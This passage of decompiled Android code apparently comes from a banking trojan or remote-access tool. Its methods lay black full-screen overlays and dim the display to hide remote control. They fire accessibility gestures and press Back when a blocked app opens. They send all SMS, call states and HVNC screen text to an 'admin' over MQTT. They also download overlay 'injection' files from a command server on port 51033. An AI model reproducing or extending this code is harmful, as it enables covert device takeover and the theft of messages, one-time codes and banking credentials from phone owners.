            ViewGroup viewGroup3 = (ViewGroup) map4.Get("mView2_SamsungOnly");
            ViewGroup viewGroup4 = viewGroup3;
            PanelWrapper panelWrapper4 = (PanelWrapper) AbsObjectWrapper.ConvertToWrapper(panelWrapper3, viewGroup3);
            if (!panelWrapper2.IsInitialized() || !panelWrapper4.IsInitialized()) {
                return "";
            }
            panelWrapper2.RemoveAllViews();
            panelWrapper4.RemoveAllViews();
            panelWrapper2.RemoveView();
            panelWrapper4.RemoveView();
            try {
                new JavaObject();
                JavaObject javaObject = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}));
                javaObject.RunMethod("removeView", new Object[]{panelWrapper2.getObject()});
                javaObject.RunMethod("removeView", new Object[]{panelWrapper4.getObject()});
            } catch (Exception e) {
                processBA.setLastException(e);
                Common.LogImpl("68912927", BA.ObjectToString(Common.LastException(processBA)), 0);
            }
            _overlaywindow1.Close();
            return "";
        } catch (Exception e2) {
            processBA.setLastException(e2);
            Common.LogImpl("68912940", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 1072 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _requestpowermngt() throws Exception {
        if (((int) BA.ObjectToNumber(new Reflection().GetStaticField("android.os.Build$VERSION", "SDK_INT"))) < 23) {
            return "";
        }
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(processBA);
        if (BA.ObjectToBoolean(javaObject.RunMethod("isIgnoringBatteryOptimizations", (Object[]) Common.Null))) {
            return "";
        }
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeContext(processBA);
        javaObject2.RunMethod("ShowPermissionDialog", (Object[]) Common.Null);
        return "";
    }

    public static String _rundispatchgesture(Map map) throws Exception {
        _acs.DispatchGesture_Normal((int) BA.ObjectToNumber(map.Get("GestX")), (int) BA.ObjectToNumber(map.Get("GestY")), (int) BA.ObjectToNumber(map.Get("EndPointGestX")), (int) BA.ObjectToNumber(map.Get("EndPointGestY")));
        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
        return "";
    }

    public static String _samsung_overlay_pans() throws Exception {
        try {
            Common.LogImpl("66160387", "Add_OverLayPans", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.KeepAlive(processBA, false);
            _writesetting("screen_brightness", 1);
            new Phone();
            PanelWrapper panelWrapper = new PanelWrapper();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            int i2 = (int) globalparameters._getrealheight;
            int i3 = Phone.getSdkVersion() >= 26 ? 2032 : 2002;
            panelWrapper.Initialize(processBA, "");
            Colors colors = Common.Colors;
            panelWrapper.setColor(-16777216);
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 536, -3});
            javaObject.SetField("gravity", 51);
            javaObject.SetField("x", 0);
            javaObject.SetField("y", -250);
            javaObject.SetField("width", Integer.valueOf(i));
            javaObject.SetField("height", Integer.valueOf(i2 + 400));
            JavaObject javaObject2 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}));
            _samsung_windowmanager = javaObject2;
            javaObject2.RunMethod("addView", new Object[]{panelWrapper.getObject(), javaObject.getObject()});
            List list = new List();
            list.Initialize();
            list.Clear();
            list.Add(panelWrapper.getObject());
            _tempsamsungpane2.Initialize();
            _tempsamsungpane2.Clear();
            _tempsamsungpane2.Add(list.getObject());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66160432", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    /* JADX WARN: Multi-variable type inference failed */
    public static String _samsung_overlay_pans_co(String str, String str2, String str3, String str4, boolean z) throws Exception {
        String sb;
        try {
            Common.LogImpl("65767172", "Add_OverLayPans", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.KeepAlive(processBA, false);
            _writesetting("screen_brightness", 1);
            new Phone();
            PanelWrapper panelWrapper = new PanelWrapper();
            WebViewWrapper webViewWrapper = new WebViewWrapper();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            int i2 = (int) globalparameters._getrealheight;
            int i3 = Phone.getSdkVersion() >= 26 ? 2032 : 2002;
            panelWrapper.Initialize(processBA, "");
            Colors colors = Common.Colors;
            panelWrapper.setColor(-16777216);
            webViewWrapper.Initialize(processBA, "");
            webViewWrapper.setJavaScriptEnabled(true);
            webViewWrapper.setZoomEnabled(false);
            JavaObject javaObject = new JavaObject();
            if (z) {
                javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 536, -3});
            } else {
                javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 1576, -3});
            }
            javaObject.SetField("gravity", 51);
            javaObject.SetField("x", 0);
            javaObject.SetField("y", -250);
            javaObject.SetField("width", Integer.valueOf(i));
            javaObject.SetField("height", Integer.valueOf(i2 + 400));
            JavaObject javaObject2 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}));
            _samsung_windowmanager = javaObject2;
            javaObject2.RunMethod("addView", new Object[]{panelWrapper.getObject(), javaObject.getObject()});
            panelWrapper.AddView((View) webViewWrapper.getObject(), 0, 150, i, i2);
            File file = Common.File;
            if (str4.contains(File.getDirInternal())) {
                sb = "file:///" + Common.SmartStringFormatter("", str4) + "";
            } else {
                StringBuilder sb2 = new StringBuilder();
                sb2.append("http://");
                globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                sb2.append(Common.SmartStringFormatter("", globalparameters._strcoo));
                sb2.append(":51033/imageupload/");
                sb2.append(Common.SmartStringFormatter("", str4));
                sb2.append("");
                sb = sb2.toString();
            }
            webViewWrapper.LoadHtml("\n\t\t<html>\n\t\t\t<body style=\"min-width:100%;max-height:100%;background-color: " + Common.SmartStringFormatter("", str) + ";margin-top:40px !important;text-align:center !important;\">\n\t\t\t\t<p style=\" text-align: center; font-size: 20; font-weight: bold; \">" + Common.SmartStringFormatter("", str2) + "</p>\n\t\t\t\t\n\t\t\t\t<img style=\"min-width:90%;max-width:90%;margin-top:100px !important;\"  src='" + Common.SmartStringFormatter("", sb) + "'>\n\t\t\t\t\n\t\t\t\t<p style=\"text-align: center;font-size: 20;font-weight: bold;bottom: 80px;position: absolute;width: 100%;\">" + Common.SmartStringFormatter("", str3) + "</p>\n\t\t\t\t\n\t\t\t</body>\n\t\t\t\n\t\t</html>\n\t\t");
            List list = new List();
            list.Initialize();
            list.Clear();
            list.Add(panelWrapper.getObject());
            _tempsamsungpane2.Initialize();
            _tempsamsungpane2.Clear();
            _tempsamsungpane2.Add(list.getObject());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65767254", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    /* JADX WARN: Multi-variable type inference failed */
    public static String _samsung_overlay_pans_co_local(String str, int i, boolean z) throws Exception {
        try {
            Common.LogImpl("65963779", "Add_OverLayPans", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.KeepAlive(processBA, true);
            if (!z) {
                _writesetting("screen_brightness", 1);
            }
            new Phone();
            PanelWrapper panelWrapper = new PanelWrapper();
            WebViewWrapper webViewWrapper = new WebViewWrapper();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i2 = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            float f = (int) globalparameters._getrealheight;
            globalparameters globalparametersVar3 = mostCurrent._globalparameters;
            int i3 = (int) (f - globalparameters._getrealheightwithoutbars);
            Common.LogImpl("65963800", "GetRealHeightWithoutBars : " + BA.NumberToString(i3), 0);
            int i4 = Phone.getSdkVersion() >= 26 ? 2038 : 2002;
            panelWrapper.Initialize(processBA, "");
            Colors colors = Common.Colors;
            panelWrapper.setColor(-16777216);
            webViewWrapper.Initialize(processBA, "");
            webViewWrapper.setJavaScriptEnabled(true);
            webViewWrapper.setZoomEnabled(false);
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i4), Integer.valueOf(i), -3});
            javaObject.SetField("gravity", 51);
            javaObject.SetField("x", 0);
            javaObject.SetField("y", 0);
            javaObject.SetField("width", Integer.valueOf(i2));
            javaObject.SetField("height", Integer.valueOf(i3));
            JavaObject javaObject2 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}));
            _samsung_windowmanager = javaObject2;
            javaObject2.RunMethod("addView", new Object[]{panelWrapper.getObject(), javaObject.getObject()});
            panelWrapper.AddView((View) webViewWrapper.getObject(), 0, 0, i2, i3);
            WebViewExtras webViewExtras = new WebViewExtras();
            webViewExtras.Initialize((WebView) webViewWrapper.getObject());
            DefaultWebChromeClient defaultWebChromeClient = new DefaultWebChromeClient();
            defaultWebChromeClient.Initialize(processBA, "WebChromeClient1");
            webViewExtras.SetWebChromeClient(defaultWebChromeClient.getObject());
            webViewWrapper.LoadHtml(str);
            List list = new List();
            list.Initialize();
            list.Clear();
            list.Add(panelWrapper.getObject());
            _tempsamsungpane2.Initialize();
            _tempsamsungpane2.Clear();
            _tempsamsungpane2.Add(list.getObject());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65963849", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    /* JADX WARN: Multi-variable type inference failed */
    public static String _samsung_overlay_pans_url(String str) throws Exception {
        try {
            Common.LogImpl("66094851", "Add_OverLayPans", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.KeepAlive(processBA, false);
            _writesetting("screen_brightness", 1);
            new Phone();
            PanelWrapper panelWrapper = new PanelWrapper();
            WebViewWrapper webViewWrapper = new WebViewWrapper();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            int i = (int) globalparameters._getrealwidth;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            int i2 = (int) globalparameters._getrealheight;
            int i3 = Phone.getSdkVersion() >= 26 ? 2032 : 2002;
            panelWrapper.Initialize(processBA, "");
            Colors colors = Common.Colors;
            panelWrapper.setColor(-16777216);
            webViewWrapper.Initialize(processBA, "");
            webViewWrapper.setJavaScriptEnabled(true);
            webViewWrapper.setZoomEnabled(false);
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeNewInstance("android.view.WindowManager$LayoutParams", new Object[]{-1, -1, Integer.valueOf(i3), 1576, -3});
            javaObject.SetField("gravity", 51);
            javaObject.SetField("x", 0);
            javaObject.SetField("y", -250);
            javaObject.SetField("width", Integer.valueOf(i));
            javaObject.SetField("height", Integer.valueOf(i2 + 400));
            JavaObject javaObject2 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getcontext().RunMethod("getSystemService", new Object[]{"window"}));
            _samsung_windowmanager = javaObject2;
            javaObject2.RunMethod("addView", new Object[]{panelWrapper.getObject(), javaObject.getObject()});
            panelWrapper.AddView((View) webViewWrapper.getObject(), 0, 150, i, i2);
            webViewWrapper.LoadUrl(str);
            List list = new List();
            list.Initialize();
            list.Clear();
            list.Add(panelWrapper.getObject());
            _tempsamsungpane2.Initialize();
            _tempsamsungpane2.Clear();
            _tempsamsungpane2.Add(list.getObject());
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66094907", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    public static String _samsung_remove_overlay_pane() throws Exception {
        try {
            _writesetting("screen_brightness", 255);
            if (_tempsamsungpane2.IsInitialized()) {
                int size = _tempsamsungpane2.getSize() - 1;
                for (int i = 0; i <= size; i++) {
                    new List();
                    List list = new List();
                    java.util.List list2 = (java.util.List) _tempsamsungpane2.Get(i);
                    java.util.List list3 = list2;
                    List list4 = (List) AbsObjectWrapper.ConvertToWrapper(list, list2);
                    new PanelWrapper();
                    PanelWrapper panelWrapper = new PanelWrapper();
                    ViewGroup viewGroup = (ViewGroup) list4.Get(i);
                    ViewGroup viewGroup2 = viewGroup;
                    PanelWrapper panelWrapper2 = (PanelWrapper) AbsObjectWrapper.ConvertToWrapper(panelWrapper, viewGroup);
                    panelWrapper2.RemoveAllViews();
                    _samsung_windowmanager.RunMethod("removeView", new Object[]{panelWrapper2.getObject()});
                }
            }
            _samsung_windowmanager = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), Common.Null);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66225939", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _send_hnvc_toserver_textstable(List list) throws Exception {
        try {
            if (!_mqtt.IsInitialized() || !_mqtt.getConnected()) {
                return "";
            }
            JSONParser.JSONGenerator jSONGenerator = new JSONParser.JSONGenerator();
            jSONGenerator.Initialize2(list);
            Map map = new Map();
            map.Initialize();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            map.Put("deviceid", globalparameters._intwhoisconnectedtome);
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            map.Put("mydeviceid", globalparameters._mydeviceid);
            map.Put("error", jSONGenerator.ToString());
            _sendeventtoserver("Send_HVNC_Texts_ToAdmin_FromAndroid", map);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69699347", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static void _send_inj_lst(Map map) throws Exception {
        new ResumableSub_send_inj_lst(null, map).resume(processBA, null);
    }

    public static class ResumableSub_send_inj_lst extends BA.ResumableSub {
        Map _mp;
        BA.IterableList group8;
        int groupLen8;
        int index8;
        backgroundservice parent;
        SQL _sql = null;
        List _lst = null;
        Map _data = null;
        boolean _isfoundindb = false;
        SQL.ResultSetWrapper _rr = null;

        /* renamed from: _j */
        httpjob f341_j = null;
        String _strfilename = "";
        File.OutputStreamWrapper _outstream = null;
        ArchiverPlusZip _ar = null;

        public ResumableSub_send_inj_lst(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._mp = map;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 41;
                            this.catchState = 34;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 34;
                            Common.LogImpl("65373954", "send_inj_lst", 0);
                            backgroundservice._acs.remove_lst_ovlypks();
                            SQL sql = new SQL();
                            this._sql = sql;
                            File file = Common.File;
                            sql.Initialize(File.getDirInternal(), "db.db", false);
                            this._lst = new List();
                            List list = new List();
                            java.util.List list2 = (java.util.List) this._mp.Get("inj");
                            java.util.List list3 = list2;
                            this._lst = (List) AbsObjectWrapper.ConvertToWrapper(list, list2);
                            break;
                        case 4:
                            this.state = 27;
                            this._data = new Map();
                            List list4 = this._lst;
                            this.group8 = list4;
                            this.index8 = 0;
                            this.groupLen8 = list4.getSize();
                            this.state = 42;
                            break;
                        case 6:
                            this.state = 7;
                            globalparameters globalparametersVar = backgroundservice.mostCurrent._globalparameters;
                            globalparameters._mpinjlist.Put(this._data.Get("pkgname"), this._data.Get("filename"));
                            this._isfoundindb = false;
                            this._rr = new SQL.ResultSetWrapper();
                            this._rr = (SQL.ResultSetWrapper) AbsObjectWrapper.ConvertToWrapper(new SQL.ResultSetWrapper(), this._sql.ExecQuery2("select * from pksinfo where pkgname=?", new String[]{BA.ObjectToString(this._data.Get("pkgname"))}));
                            break;
                        case 7:
                            this.state = 10;
                            if (!this._rr.NextRow()) {
                                break;
                            } else {
                                this.state = 9;
                                break;
                            }
                        case 9:
                            this.state = 7;
                            this._isfoundindb = true;
                            break;
                        case 10:
                            this.state = 11;
                            this._rr.Close();
                            break;
                        case 11:
                            this.state = 18;
                            if (!this._isfoundindb) {
                                break;
                            } else {
                                this.state = 13;
                                break;
                            }
                        case 13:
                            this.state = 14;
                            this._sql.BeginTransaction();
                            this._sql.ExecNonQuery2("delete from pksinfo where pkgname=?", Common.ArrayToList(new Object[]{this._data.Get("pkgname")}));
                            this._sql.TransactionSuccessful();
                            this._sql.EndTransaction();
                            break;
                        case 14:
                            this.state = 17;
                            File file2 = Common.File;
                            File file3 = Common.File;
                            if (!File.Exists(File.getDirInternal(), BA.ObjectToString(this._data.Get("filename")))) {
                                break;
                            } else {
                                this.state = 16;
                                break;
                            }
                        case 16:
                            this.state = 17;
                            File file4 = Common.File;
                            File file5 = Common.File;
                            File.Delete(File.getDirInternal(), BA.ObjectToString(this._data.Get("filename")));
                            break;
                        case 17:
                            this.state = 18;
                            break;
                        case 18:
                            this.state = 19;
                            this._sql.BeginTransaction();
                            this._sql.ExecNonQuery2("insert into pksinfo (pkgname,filename) values (?,?)", Common.ArrayToList(new Object[]{this._data.Get("pkgname"), this._data.Get("filename")}));
                            this._sql.TransactionSuccessful();
                            this._sql.EndTransaction();
                            break;
                        case 19:
                            this.state = 26;
                            File file6 = Common.File;
                            File file7 = Common.File;
                            if (!File.Exists(File.getDirInternal(), BA.ObjectToString(this._data.Get("filename")))) {
                                this.state = 21;
                                break;
                            } else {
                                break;
                            }
                        case 21:
                            this.state = 22;
                            StringBuilder sb = new StringBuilder();
                            sb.append("http://");
                            globalparameters globalparametersVar2 = backgroundservice.mostCurrent._globalparameters;
                            sb.append(globalparameters._strcoo);
                            sb.append(":51033/injectionsupload/");
                            sb.append(BA.ObjectToString(this._data.Get("filename")));
                            Common.LogImpl("65374000", sb.toString(), 0);
                            httpjob httpjobVar = new httpjob();
                            this.f341_j = httpjobVar;
                            httpjobVar._initialize(backgroundservice.processBA, "j", backgroundservice.getObject());
                            this.f341_j._tag = this._data.Get("filename");
                            httpjob httpjobVar2 = this.f341_j;
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("http://");
                            globalparameters globalparametersVar3 = backgroundservice.mostCurrent._globalparameters;
                            sb2.append(globalparameters._strcoo);
                            sb2.append(":51033/injectionsupload/");
                            sb2.append(BA.ObjectToString(this._data.Get("filename")));
                            httpjobVar2._download(sb2.toString());
                            Common.WaitFor("jobdone", backgroundservice.processBA, this, this.f341_j);
                            this.state = 44;
                            return;
                        case 22:
                            this.state = 25;
                            if (!this.f341_j._success) {
                                break;
                            } else {
                                this.state = 24;
                                break;
                            }
                        case 24:
                            this.state = 25;
                            Common.LogImpl("65374008", "inj file downlaoded", 0);
                            this._strfilename = "";
                            this._strfilename = BA.ObjectToString(this.f341_j._tag);
                            this._outstream = new File.OutputStreamWrapper();
                            File file8 = Common.File;
                            File file9 = Common.File;
                            this._outstream = File.OpenOutput(File.getDirInternal(), BA.ObjectToString(this.f341_j._tag), false);
                            File file10 = Common.File;
                            File.Copy2(this.f341_j._getinputstream().getObject(), this._outstream.getObject());
                            this._outstream.Close();
                            this._strfilename = this._strfilename.replace(".zip", "");
                            Common.LogImpl("65374020", "strFileName : " + this._strfilename, 0);
                            ArchiverPlusZip archiverPlusZip = new ArchiverPlusZip();
                            this._ar = archiverPlusZip;
                            BA ba2 = backgroundservice.processBA;
                            File file11 = Common.File;
                            File file12 = Common.File;
                            String Combine = File.Combine(File.getDirInternal(), this._strfilename + ".zip");
                            File file13 = Common.File;
                            archiverPlusZip.UnZip(ba2, Combine, File.getDirInternal(), "");
                            Common.LogImpl("65374024", "ar zip is done", 0);
                            break;
                        case 25:
                            this.state = 26;
                            this.f341_j._release();
                            break;
                        case 26:
                            this.state = 43;
                            Common.Sleep(backgroundservice.processBA, this, 0);
                            this.state = 45;
                            return;
                        case 27:
                            this.state = 32;
                            if (this._sql.IsInitialized() && this._sql != null) {
                                this.state = 29;
                                break;
                            }
                            break;
                        case KeyCodes.KEYCODE_A /* 29 */:
                            this.state = 32;
                            this._sql.Close();
                            break;
                        case 32:
                            this.state = 41;
                            break;
                        case 34:
                            this.state = 35;
                            this.catchState = 0;
                            break;
                        case 35:
                            this.state = 40;
                            if (this._sql.IsInitialized() && this._sql != null) {
                                this.state = 37;
                                break;
                            }
                            break;
                        case 37:
                            this.state = 40;
                            this._sql.Close();
                            break;
                        case 40:
                            this.state = 41;
                            Common.LogImpl("65374046", BA.ObjectToString(Common.LastException(backgroundservice.processBA)), 0);
                            backgroundservice._send_toserver_errors("Line 230 " + Common.LastException(backgroundservice.processBA).getMessage());
                            break;
                        case 41:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                        case 42:
                            this.state = 27;
                            if (this.index8 >= this.groupLen8) {
                                break;
                            } else {
                                this.state = 6;
                                Map map = new Map();
                                java.util.Map map2 = (java.util.Map) this.group8.Get(this.index8);
                                java.util.Map map3 = map2;
                                this._data = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                                break;
                            }
                        case 43:
                            this.state = 42;
                            this.index8++;
                            break;
                        case 44:
                            this.state = 22;
                            this.f341_j = (httpjob) objArr[0];
                            break;
                        case 45:
                            this.state = 43;
                            backgroundservice._acs.add_lst_ovlypks(BA.ObjectToString(this._data.Get("pkgname")), BA.ObjectToString(this._data.Get("filename")));
                            break;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    backgroundservice.processBA.setLastException(e);
                }
            }
        }
    }

    public static String _send_phone_iscalling(String str, String str2) throws Exception {
        try {
            Common.LogImpl("69895938", "Send_Phone_IsCalling", 0);
            if (!_mqtt.IsInitialized() || !_mqtt.getConnected()) {
                return "";
            }
            Map map = new Map();
            map.Initialize();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            map.Put("DeviceID", globalparameters._mydeviceid);
            map.Put("state", str);
            map.Put("phonenumber", str2);
            _mqtt.Publish2("Send_Phone_IsCalling", new B4XSerializator().ConvertObjectToBytes(map.getObject()), 1, false);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69895951", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _send_sms_to_admin() throws Exception {
        try {
            SmsWrapper smsWrapper = new SmsWrapper();
            new List();
            List list = new List();
            list.Initialize();
            List GetAll = smsWrapper.GetAll();
            if (GetAll.IsInitialized()) {
                GetAll.SortType("Date", true);
            }
            int size = GetAll.getSize() - 1;
            for (int i = 0; i <= size; i++) {
                new SmsWrapper.Sms();
                SmsWrapper.Sms sms = (SmsWrapper.Sms) GetAll.Get(i);
                SmsWrapper.Sms sms2 = sms;
                Map map = new Map();
                map.Initialize();
                map.Put("Address", sms.Address);
                map.Put("Body", sms.Body);
                map.Put("Date", Long.valueOf(sms.Date));
                map.Put("SMSID", Integer.valueOf(sms.f369Id));
                list.Add(map.getObject());
            }
            Map map2 = new Map();
            map2.Initialize();
            map2.Put("smsdata", list.getObject());
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            map2.Put("DeviceID", globalparameters._mydeviceid);
            map2.Put("displaytype", "allsms");
            B4XSerializator b4XSerializator = new B4XSerializator();
            if (!_mqtt.IsInitialized() || !_mqtt.getConnected()) {
                return "";
            }
            _mqtt.Publish2("Send_SMS_To_Admin_From_Android", b4XSerializator.ConvertObjectToBytes(map2.getObject()), 1, false);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68388644", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 830 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static Common.ResumableSubWrapper _senddrawact(List list) throws Exception {
        ResumableSub_senddrawact resumableSub_senddrawact = new ResumableSub_senddrawact(null, list);
        resumableSub_senddrawact.resume(processBA, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_senddrawact);
    }

    public static class ResumableSub_senddrawact extends BA.ResumableSub {
        List _lst;
        String _str = "";
        backgroundservice parent;

        public ResumableSub_senddrawact(backgroundservice backgroundserviceVar, List list) {
            this.parent = backgroundserviceVar;
            this._lst = list;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            Common.ReturnFromResumableSub(this, null);
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 18;
                            this.catchState = 17;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 17;
                            break;
                        case 4:
                            this.state = 15;
                            if (backgroundservice._strblockedpackagename.trim().length() > 0) {
                                this.state = 6;
                                break;
                            } else {
                                this.state = 14;
                                break;
                            }
                        case 6:
                            this.state = 7;
                            this._str = "";
                            this._str = BA.ObjectToString(this._lst);
                            break;
                        case 7:
                            this.state = 12;
                            if (this._str.toLowerCase().contains(backgroundservice._strblockedpackagename.toLowerCase())) {
                                this.state = 9;
                                break;
                            } else {
                                this.state = 11;
                                break;
                            }
                        case 9:
                            this.state = 12;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            accessibilityEventsListener.PerformGlobalAction(2);
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            break;
                        case 11:
                            this.state = 12;
                            backgroundservice._draw_views_sendvia_mjpeg(this._lst);
                            break;
                        case 12:
                            this.state = 15;
                            break;
                        case 14:
                            this.state = 15;
                            backgroundservice._draw_views_sendvia_mjpeg(this._lst);
                            break;
                        case 15:
                            this.state = 18;
                            break;
                        case 17:
                            this.state = 18;
                            this.catchState = 0;
                            Common.LogImpl("69437202", BA.ObjectToString(Common.LastException(backgroundservice.processBA)), 0);
                            backgroundservice._send_toserver_errors("senddrawact " + Common.LastException(backgroundservice.processBA).getMessage());
                            break;
                        case 18:
                            this.state = -1;
                            this.catchState = 0;
                            Common.ReturnFromResumableSub(this, Common.Null);
                            return;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    backgroundservice.processBA.setLastException(e);
                }
            }
        }
    }

    public static String _sendeventtoserver(String str, Map map) throws Exception {
        try {
            map.Put("fun", str);
            B4XSerializator b4XSerializator = new B4XSerializator();
            if (!_mqtt.IsInitialized() || !_mqtt.getConnected()) {
                return "";
            }
            _mqtt.Publish2("commands_FromAndroid", b4XSerializator.ConvertObjectToBytes(map.getObject()), 1, false);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66488076", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static Common.ResumableSubWrapper _sendpat(List list) throws Exception {
        ResumableSub_sendpat resumableSub_sendpat = new ResumableSub_sendpat(null, list);
        resumableSub_sendpat.resume(processBA, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_sendpat);
    }

    public static class ResumableSub_sendpat extends BA.ResumableSub {
        List _lst;
        Map _mp = null;
        B4XSerializator _ser = null;
        backgroundservice parent;

        public ResumableSub_sendpat(backgroundservice backgroundserviceVar, List list) {
            this.parent = backgroundserviceVar;
            this._lst = list;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                int i = this.state;
                if (i == -1) {
                    Common.ReturnFromResumableSub(this, null);
                    return;
                }
                if (i == 0) {
                    this.state = 1;
                } else if (i == 1) {
                    this.state = 4;
                    if (backgroundservice._mqtt.IsInitialized() && backgroundservice._mqtt.getConnected()) {
                        this.state = 3;
                    }
                } else if (i == 3) {
                    this.state = 4;
                    Map map = new Map();
                    this._mp = map;
                    map.Initialize();
                    Map map2 = this._mp;
                    globalparameters globalparametersVar = backgroundservice.mostCurrent._globalparameters;
                    map2.Put("DeviceID", globalparameters._mydeviceid);
                    this._mp.Put("data", this._lst.getObject());
                    this._ser = new B4XSerializator();
                    backgroundservice._mqtt.Publish2("patt_data", this._ser.ConvertObjectToBytes(this._mp.getObject()), 1, false);
                } else if (i == 4) {
                    this.state = -1;
                }
            }
        }
    }

    public static String _service_create() throws Exception {
        _cls_perm_notification1._initialize(processBA);
        _cls_perm_draw1._initialize(processBA);
        _cls_perm_syswrte1._initialize(processBA);
        _cls_perm_oheraps1._initialize(processBA);
        _cls_perm_phneperms1._initialize(processBA);
        _cls_perm_pwr1._initialize(processBA);
        _reload_fs();
        new Phone();
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        globalparameters._mydeviceid = Phone.GetSettings("android_id");
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        globalparameters._get_realdevicesizes_fromfile(processBA);
        _connect_to_server_broker();
        _inthquality = 9;
        Phone.PhoneWakeState.PartialLock(processBA);
        Phone.PhoneWakeState.ReleaseKeepAlive();
        Phone.PhoneWakeState.KeepAlive(processBA, true);
        new Phone();
        Colors colors = Common.Colors;
        _isimportantviewsonly = -16777216;
        _clsudpconnector1._initialize(processBA);
        _clsudpconnector1._setinfo();
        globalparameters globalparametersVar3 = mostCurrent._globalparameters;
        globalparameters._intvncfps = 7;
        globalparameters globalparametersVar4 = mostCurrent._globalparameters;
        globalparameters._get_realdevicesizes_fromfile(processBA);
